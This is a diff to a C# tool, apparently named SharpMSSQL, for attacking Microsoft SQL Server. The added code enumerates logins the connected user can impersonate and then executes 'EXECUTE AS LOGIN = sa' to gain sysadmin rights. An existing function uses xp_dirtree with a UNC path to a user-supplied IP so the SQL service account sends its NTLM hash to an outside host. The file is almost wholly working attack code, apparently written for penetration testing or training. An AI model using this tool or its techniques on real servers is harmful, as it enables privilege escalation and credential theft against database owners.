@@ -5,10 +5,51 @@ using System.Runtime.Remoting.Messaging;
 namespace SQL
 {
     class Program
-    {
+    {   
+
+        static void impersonation(SqlConnection con)
+        {
+            String executeas = "EXECUTE AS LOGIN = 'sa';";
+        
+            SqlCommand command = new SqlCommand(executeas, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+            // Check Who is logged in
+            String querylogin = "SELECT SYSTEM_USER;";
+            command = new SqlCommand(querylogin, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("Logged in as: " + reader[0]);
+            Console.ResetColor();
+            reader.Close();
+        }
+
+        static bool check_imperonated_logins(SqlConnection con)
+        {
+            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
+            SqlCommand command = new SqlCommand(query, con);
+            SqlDataReader reader = command.ExecuteReader();
+
+            if (reader.HasRows){
+                while (reader.Read() == true){
+                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
+                }
+                reader.Close();
+                return true;
+            }
+            else
+            {
+                Console.WriteLine("No accounts can be impersonated");
+                reader.Close();
+                return false;
+            }
+        }
+
+        // Check role assignment
         static void check_role(SqlConnection con, string roleName)
         {
-            // Check if only public role
+            
             String querypublicrole = $"SELECT IS_SRVROLEMEMBER('{roleName}');";
             SqlCommand command = new SqlCommand(querypublicrole, con);
             SqlDataReader reader = command.ExecuteReader();
@@ -28,6 +69,8 @@ namespace SQL
             }
             reader.Close();
         }
+
+        // Check basic info
         static void enum_current_user(SqlConnection con)
         {
             // Check Who is logged in
@@ -40,10 +83,16 @@ namespace SQL
 
             check_role(con, "public");
             check_role(con, "sysadmin");
+            if (check_imperonated_logins(con))
+            {
+                Console.WriteLine("Some logins to impersonate found ... tryint to impersonate");
+                impersonation(con);
+            }
+            
  
-            con.Close();
         }
 
+        // Send nt hash of sql service to given IP address
         static void get_svchash(SqlConnection con, string srvIP)
         {
             String query = $"EXEC master..xp_dirtree \"\\\\{srvIP}\\\\test\";";
@@ -56,7 +105,7 @@ namespace SQL
 
         static void DisplayUsage()
         {
-            Console.WriteLine("Usage: YourProgramName <sqlServer> <dbName> <operation> <hashServer>");
+            Console.WriteLine("Usage: SharpMSSQL <sqlServer> <dbName> <operation> <hashServer>");
             Console.WriteLine("Arguments:");
             Console.WriteLine("  <sqlServer>    SQL Server name (required)");
             Console.WriteLine("  <dbName>       Database name (required)");
@@ -96,6 +145,7 @@ namespace SQL
             {
                 case "enum":
                     enum_current_user(con);
+                    con.Close();
                     break;
                 case "gethash":
                     if (args.Length < 4)
@@ -105,6 +155,7 @@ namespace SQL
                         return;
                     }
                     get_svchash(con, args[3]);
+                    con.Close();
                     break;
 
                 default:
